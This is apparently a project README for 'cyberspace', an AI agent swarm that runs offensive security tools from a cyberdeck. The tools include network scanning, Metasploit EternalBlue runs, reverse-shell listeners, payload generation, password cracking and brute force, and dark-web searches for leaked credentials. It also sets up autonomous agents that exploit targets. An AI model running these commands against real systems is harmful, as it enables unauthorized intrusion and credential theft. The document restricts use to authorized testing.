<p align="center">
  <img src=".github/banner.svg" width="640" alt="cyberspace">
</p>

<p align="center">
  <img alt="Python" src="https://img.shields.io/badge/Python-3.10+-blue?logo=python&logoColor=white">
  <img alt="License" src="https://img.shields.io/github/license/nim2natty/cyberspace?color=green">
  <img alt="Stars" src="https://img.shields.io/github/stars/nim2natty/cyberspace?style=social">
</p>

---

## What is cyberspace?

**cyberspace is the brain for your cyberdeck.**

A cyberdeck is a portable, custom-built hacking computer. cyberspace is the
software that runs on it — an AI assistant that talks to you in plain English and
does the work of an entire security team.

You tell it what you want to do (for example: *"scan my home network and tell me
what's vulnerable"*). It figures out which tools to use, runs them, and explains
the results in a way you can understand — even if you're not a security expert.

> **Built for:** the cyberdeck you're manufacturing. It runs on a Raspberry Pi 5,
> a laptop, or anything that runs Linux, macOS, or Windows.

## How it works

Behind the scenes, cyberspace is a **team of AI agents** — think of them as
digital coworkers, each with a different job:

| Agent | Job (in plain English) |
|---|---|
| **Recon** 📶 | The scout. Maps out a network — finds every device, what ports are open, what software is running. |
| **Exploit** 🐍 | The tester. Tries to break into things you've found, using tools like Metasploit (a famous hacking toolkit). |
| **Ghost** 🧊 | The spy. Keeps you anonymous (a special browser that hides your identity) and searches the dark web for information. |
| **Hardware** 🔌 | The hands. Controls physical gear — a WiFi attack board (ESP32), a serial cable (FT232), and your OpenWrt router. |
| **Smith** 🤖 | The engineer. Builds custom AI models — you describe what you want the AI to be good at, and it trains one. |
| **Scribe** 📝 | The writer. Takes everything the team found and writes a clear report. |

You don't talk to each agent individually. You talk to the **Orchestrator** — the
team lead. You give it a goal, and it hands out the work.

```
       you  →  ORCHESTRATOR  →  [ Recon → Exploit → Scribe → ... ]
```

## Getting started

**One command** gets you going:

```bash
cyberspace quickstart
```

This asks you to pick an AI model (the "brain" — you can use a free local one like
Ollama, or a paid cloud one like OpenAI), then drops you into the swarm.

**Or step by step:**

```bash
cyberspace setup      # choose your AI model
cyberspace swarm      # start the team
```

<details>
<summary><b>Install on a cyberdeck / Raspberry Pi / from source</b></summary>

```bash
# From source (on the cyberdeck)
git clone https://github.com/nim2natty/cyberspace && cd cyberspace
python3 -m venv .venv && source .venv/bin/activate
pip install -e . && playwright install chromium

# Docker (anywhere)
docker build -t cyberspace .
docker run -it --rm cyberspace swarm

# Flash a Raspberry Pi 5 image (see installer/rpi-build/)
```
</details>


## The easiest way: let the AI do everything

```bash
cyberspace swarm
```

This drops you into a chat. Just type what you want in plain English:

```
mission> scan 192.168.1.0/24, find any web apps, test them for vulnerabilities, then write a report
```

The Orchestrator breaks that into steps and hands each one to the right agent.
You watch the work happen, then get a summary.

**But you can also run each tool yourself.** Here's how to use every part of the
system directly from the command line.

---

## Walkthrough: each platform

### 1. AirBender 📶 — scanning networks

AirBender finds every device on a network and figures out what each one is running.
It wraps tools like `nmap` (a network scanner) and chains them together.

```bash
# STEP 1: Check what's installed
cyberspace airbender status

# STEP 2: Find every device on your network (replace with your network range)
cyberspace airbender ping-sweep 192.168.1.0/24

# STEP 3: Scan a specific device for open doors (ports)
cyberspace airbender nmap 192.168.1.50

# STEP 4: Run the full pipeline — find devices, scan ports, identify services
cyberspace airbender recon 192.168.1.0/24

# STEP 5: Quick scan — find devices, blast all ports fast
cyberspace airbender fast-scan 192.168.1.0/24

# STEP 6: Find web servers specifically
cyberspace airbender web-hunt 192.168.1.0/24

# Other single tools:
cyberspace airbender whois example.com        # who owns this domain
cyberspace airbender dig example.com           # DNS lookup
cyberspace airbender traceroute 8.8.8.8        # trace the path to a host
cyberspace airbender netdiscover 192.168.1.0/24  # ARP-based device discovery
```

<details>
<summary><b>Advanced: custom pipelines</b></summary>

```bash
# Build your own chain — each step feeds the next:
cyberspace airbender chain 192.168.1.0/24 --steps "ping-sweep->nmap-top->service-detect"

# See all available pipeline steps:
cyberspace airbender pipelines

# WiFi monitoring (needs a WiFi adapter in monitor mode):
cyberspace airbender airmon wlan0 start     # enable monitor mode
cyberspace airbender airodump wlan0mon      # scan for nearby WiFi networks
```
</details>

---

### 2. ShadowDragon 🐍 — breaking into things

ShadowDragon tests web applications for weaknesses and can launch attacks using
the full Kali Linux toolkit — including Metasploit.

```bash
# STEP 1: Check what's installed
cyberspace shadowdragon catalog          # list all 70+ tools it can run

# STEP 2: Identify what a web app is built with
cyberspace shadowdragon whatweb http://10.10.10.5

# STEP 3: Find hidden pages/directories
cyberspace shadowdragon gobuster http://10.10.10.5

# STEP 4: Scan for known vulnerabilities
cyberspace shadowdragon nikto http://10.10.10.5

# STEP 5: Search for public exploits
cyberspace shadowdragon searchsploit "Apache 2.4"

# STEP 6: Test for SQL injection
cyberspace shadowdragon sqlmap http://10.10.10.5/login.php

# STEP 7: Run the full attack chain — one command does all of the above + more
cyberspace shadowdragon full-assault http://10.10.10.5
```

<details>
<summary><b>Metasploit (the exploit framework)</b></summary>

```bash
# Search for an exploit module
cyberspace shadowdragon msf search eternalblue

# Run an exploit (replace module + target):
cyberspace shadowdragon msf run exploit/windows/smb/ms17_010_eternalblue \
    --options "RHOSTS=10.10.10.5" --lhost 10.10.10.1

# Start a listener to catch a reverse shell:
cyberspace shadowdragon msf handler --lhost 0.0.0.0 --lport 4444

# Generate a payload (malware for testing):
cyberspace shadowdragon msf payload --lhost 10.10.10.1 --lport 4444
```
</details>

<details>
<summary><b>Password cracking</b></summary>

```bash
# Crack a hash file with John the Ripper:
cyberspace shadowdragon john hashes.txt

# Crack with hashcat (GPU-accelerated):
cyberspace shadowdragon hashcat "e99a18c428cb38d5f260853678922e03"

# Brute-force a login (SSH, FTP, etc.):
cyberspace shadowdragon hydra 10.10.10.5 --service ssh
```
</details>

<details>
<summary><b>Reconnaissance and OSINT</b></summary>

```bash
# Gather emails, subdomains, and more for a domain:
cyberspace shadowdragon theharvester example.com

# Run ANY Kali tool that isn't networking:
cyberspace shadowdragon run "nuclei" "-u http://10.10.10.5"
cyberspace shadowdragon run "wpscan" "--url http://10.10.10.5"
```
</details>

---

### 3. IceBerg 🧊 — staying hidden and searching the web

IceBerg has two sides: a privacy browser that hides your identity, and an AI search
tool that can search the regular web (brightside) or the dark web (darkside).

```bash
# STEP 1: Check if Tor (the anonymity network) is running
cyberspace iceberg secure status

# STEP 2: Set up your security posture (do this BEFORE dark web browsing)
cyberspace iceberg secure config

# STEP 3: Search the REGULAR web with AI
cyberspace iceberg secure find "latest ransomware groups" --mode bright

# STEP 4: Search the DARK WEB with AI (needs Tor running)
cyberspace iceberg secure find "leaked credentials ACME corp" --mode dark

# STEP 5: Open the graphic interface (web browser at localhost:8501)
cyberspace iceberg secure gui
```

<details>
<summary><b>Privacy browser profiles</b></summary>

```bash
# Create a fake browser identity:
cyberspace iceberg profile new myprofile --persona win-chrome

# List your identities:
cyberspace iceberg profile list

# Browse with a fake identity (hides your real fingerprint):
cyberspace iceberg browse -p myprofile https://duckduckgo.com

# System-level privacy:
cyberspace iceberg rotate-mac --iface eth0    # change your MAC address
cyberspace iceberg set-hostname anon-host     # change your hostname
cyberspace iceberg check                       # quick privacy posture check
```
</details>

---

### 4. StickEm 🔌 — controlling hardware

StickEm drives three physical devices from one place: your ESP32 WiFi board, your
FT232 serial cable, and your OpenWrt router.

```bash
# STEP 1: List connected serial devices
cyberspace stickem ports

# STEP 2: Tell it which port your ESP32 board is on
cyberspace stickem set-esp32 /dev/ttyUSB0

# STEP 3: Tell it which port your FT232 cable is on
cyberspace stickem set-ft232 /dev/ttyUSB1

# STEP 4: Tell it your router's IP address
cyberspace stickem set-router 192.168.1.1 --type openwrt-one

# STEP 5: See all three devices at once
cyberspace stickem hardware
```

<details>
<summary><b>WiFi attacks (ESP32 Marauder)</b></summary>

```bash
# Scan for nearby WiFi networks:
cyberspace stickem marauder scanap

# See the full list of Marauder commands:
cyberspace stickem marauder help

# Open a raw serial console on the FT232 (for routers/IoT devices):
cyberspace stickem console
```
</details>

<details>
<summary><b>Router control (OpenWrt)</b></summary>

```bash
# Check router status (uptime, WiFi, interfaces):
cyberspace stickem router status

# Show current WiFi configuration:
cyberspace stickem router wifi

# List connected devices (DHCP leases):
cyberspace stickem router leases

# Change the WiFi network name:
cyberspace stickem router set-ssid MyLabNetwork

# Ping a device FROM the router:
cyberspace stickem router ping 10.10.10.5

# List installed packages on the router:
cyberspace stickem router packages
```
</details>

---

### 5. RoboDaddy 🤖 — building custom AI models

RoboDaddy trains your own AI. You describe what you want it to be good at, it picks
training data, plans the GPU rental, generates the training script, and can serve
the finished model back as the brain for the whole system.

```bash
# STEP 1: See what kinds of AI you can build
cyberspace robodaddy usecases

# STEP 2: See what training data is available for your use case
cyberspace robodaddy datasets "offensive pen security"

# STEP 3: See what GPUs you can rent and what they cost
cyberspace robodaddy gpus

# STEP 4: Search LIVE GPU prices on Vast.ai (a cloud GPU marketplace)
cyberspace robodaddy instances --gpu RTX_4090

# STEP 5: Build a training plan (interactive — picks data, model, GPU, cost)
cyberspace robodaddy plan "offensive pen security"

# STEP 6: Run the training (dry-run first — no cost, shows realistic stats)
cyberspace robodaddy train offensive_pentest --provider dry-run

# STEP 7: Check the results
cyberspace robodaddy jobs         # see loss curves, samples, cost
cyberspace robodaddy models       # see your trained models

# STEP 8: Serve the model and plug it back into the system as the new brain
cyberspace robodaddy serve offensive_pentest-d1 --target ollama
cyberspace robodaddy use offensive_pentest-d1
```

<details>
<summary><b>Real cloud training (costs money)</b></summary>

```bash
# Set your Vast.ai API key:
export VAST_API_KEY=your_key_here

# Find a GPU to rent:
cyberspace robodaddy instances --gpu RTX_4090

# Rent it and train for real (it will confirm the cost first):
cyberspace robodaddy train offensive_pentest --provider vastai --offer 123456
```
</details>

---

## Projects — save your work by task

Projects let you keep separate prompt histories for different tasks. When a
project is **active**, every prompt you send to the AI (in `swarm` or `agent`)
is automatically saved to that project's folder. Later you can open the folder
and see every prompt you used.

```bash
# Create a new project (this also makes it active):
cyberspace project create "surveillance in chicago" --desc "OSINT research"

# Now every prompt you send to the AI gets saved to that project.
# When you're done, list all your projects:
cyberspace project list

# Open a project to see all its saved prompts:
cyberspace project open "surveillance in chicago"

# Switch to a different project:
cyberspace project use "home lab pentest"

# Check which project is currently active:
cyberspace project status

# Stop saving prompts (deactivate the current project):
cyberspace project close

# Delete a project and all its prompts:
cyberspace project delete "surveillance in chicago"
```

Projects are stored as folders under `~/.cyberspace/projects/`. Each one has a
`prompts.jsonl` file with every prompt and the AI's response, timestamped.

---

## Other useful commands

```bash
# The AI remembers you — see what it's learned:
cyberspace memory show

# Change the AI brain at any time:
cyberspace iceberg model list                      # see available models
cyberspace iceberg model switch qwen2.5-coder:7b   # switch to a different model

# Generate a report from everything you've done:
cyberspace report --out my_report.md

# Check what's installed and ready:
cyberspace doctor

# See all platforms and all tools:
cyberspace modules
cyberspace tools
```

## The pieces at a glance

| Platform | What it is | Key command |
|---|---|---|
| **AirBender** 📶 | Network scanner | `cyberspace airbender recon 192.168.1.0/24` |
| **ShadowDragon** 🐍 | Web and exploit tools | `cyberspace shadowdragon full-assault http://target` |
| **IceBerg** 🧊 | Privacy browser + web search | `cyberspace iceberg secure find "query" --mode dark` |
| **StickEm** 🔌 | Hardware (WiFi + router + serial) | `cyberspace stickem hardware` |
| **RoboDaddy** 🤖 | Custom AI trainer | `cyberspace robodaddy plan "your use case"` |

## Legal use

For authorized security testing and education only. Use it on your own network,
your own devices, your own lab — or systems you have written permission to test.
Wireless and Tor features should only target equipment and networks you own.

## License

MIT — see [LICENSE](LICENSE).
